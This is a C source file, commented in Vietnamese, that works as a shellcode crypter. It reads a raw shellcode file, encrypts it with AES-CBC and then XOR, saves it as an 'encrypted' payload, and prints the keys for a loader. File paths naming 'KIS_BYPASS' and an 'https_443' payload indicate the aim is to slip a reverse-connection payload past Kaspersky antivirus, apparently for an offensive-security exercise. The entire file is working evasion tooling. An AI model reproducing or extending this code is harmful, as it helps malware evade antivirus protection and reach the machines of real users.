#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include "aes.h"
#include "aes.c"
#include <Windows.h>

#define KEYSIZE 32
#define IVSIZE 16
#define XOR_KEY_SIZE 14

// Tạo khóa XOR
void generateXorKey(unsigned char* xorKey, size_t keySize) {
    time_t now = time(NULL);
    srand((unsigned int)now);

    for (size_t i = 0; i < keySize; ++i) {
        xorKey[i] = (unsigned char)(rand() % 256) ^ ((now >> (i % 8)) & 0xFF);
    }
}

// Đọc file sc
unsigned char* readFromFile(const char* filePath, size_t* dataSize) {
    FILE* file = fopen(filePath, "rb");
    if (file == NULL) {
        printf("Failed to open file %s for reading\n", filePath);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *dataSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (*dataSize == 0) {
        printf("File %s is empty\n", filePath);
        fclose(file);
        return NULL;
    }

    unsigned char* data = (unsigned char*)malloc(*dataSize);
    if (data == NULL) {
        printf("Failed to allocate memory\n");
        fclose(file);
        return NULL;
    }

    size_t bytesRead = fread(data, sizeof(unsigned char), *dataSize, file);
    if (bytesRead != *dataSize) {
        printf("Failed to read data from file\n");
        free(data);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return data;
}

// Lưu kết quả
void saveToFile(const char* filePath, const unsigned char* data, size_t dataSize) {
    FILE* file = fopen(filePath, "wb");
    if (file == NULL) {
        printf("Failed to open file %s for writing\n", filePath);
        return;
    }

    size_t bytesWritten = fwrite(data, sizeof(unsigned char), dataSize, file);
    if (bytesWritten != dataSize) {
        printf("Failed to write data to file\n");
        fclose(file);
        return;
    }

    fclose(file);
}

// Tạo key
void generateKey(BYTE* key) {
    for (int i = 0; i < KEYSIZE; ++i) {
        key[i] = (BYTE)rand() % 256;
    }
}

// Tạo IV
void generateIV(BYTE* iv) {
    for (int i = 0; i < IVSIZE; ++i) {
        iv[i] = (BYTE)rand() % 256;
    }
}

// Padding
unsigned char* addPadding(unsigned char* data, size_t dataSize, size_t* paddedSize) {
    unsigned char paddingValue = 16 - (dataSize % 16);
    *paddedSize = dataSize + paddingValue;

    unsigned char* paddedData = (unsigned char*)malloc(*paddedSize);
    if (paddedData == NULL) {
        printf("Failed to allocate memory for padded data\n");
        return NULL;
    }

    memcpy(paddedData, data, dataSize);
    for (size_t i = dataSize; i < *paddedSize; ++i) {
        paddedData[i] = paddingValue;
    }

    return paddedData;
}

// Mã hóa XOR
void xorEncrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

int main() {
    unsigned char xorKey[XOR_KEY_SIZE];
    generateXorKey(xorKey, XOR_KEY_SIZE);

    const char* inputFilePath = ".../.bin";
    size_t shellcodeSize;

    // Kiểm tra định dạng tệp (giả sử dựa vào phần mở rộng hoặc nội dung)
    unsigned char* shellcode;
    shellcode = readFromFile(inputFilePath, &shellcodeSize);
    if (shellcode == NULL) {
        return 1;
    }

    size_t paddedSize;
    unsigned char* paddedShellcode = addPadding(shellcode, shellcodeSize, &paddedSize);
    free(shellcode);
    if (paddedShellcode == NULL) {
        return 1;
    }

    // Tạo khóa và IV
    BYTE pKey[KEYSIZE];
    BYTE pIv[IVSIZE];
    srand(time(NULL));
    generateKey(pKey);
    srand(time(NULL) ^ pKey[0]);
    generateIV(pIv);

    // Mã hóa AES-CBC
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);
    AES_CBC_encrypt_buffer(&ctx, paddedShellcode, paddedSize);

    // Mã hóa XOR
    xorEncrypt(paddedShellcode, paddedSize, xorKey, XOR_KEY_SIZE);

    printf("Encrypted shellcode:\n");
    //for (size_t i = 0; i < paddedSize; ++i) {
    //    printf("\\x%02x", paddedShellcode[i]);
    //}
    printf("\nEncrypted shellcode size: %zu\n", paddedSize);

    const char* outputFilePath = "E:\\2-2025\\TanCongMang\\HR\\2024\\Cau_2\\KIS_BYPASS\\advanced\\payload\\pl_https_443_encrypted.bin";
    saveToFile(outputFilePath, paddedShellcode, paddedSize);

    printf("Key: { ");
    for (int i = 0; i < (KEYSIZE - 1); ++i) {
        printf("0x%02x, ", pKey[i]);
    }
    printf("0x%02x }\n", pKey[KEYSIZE - 1]);

    printf("IV: { ");
    for (int i = 0; i < (IVSIZE - 1); ++i) {
        printf("0x%02x, ", pIv[i]);
    }
    printf("0x%02x }\n", pIv[IVSIZE - 1]);

    printf("XOR Key: { ");
    for (int i = 0; i < (XOR_KEY_SIZE - 1); ++i) {
        printf("0x%02x, ", xorKey[i]);
    }
    printf("0x%02x }\n", xorKey[XOR_KEY_SIZE - 1]);

    free(paddedShellcode);

    return 0;
}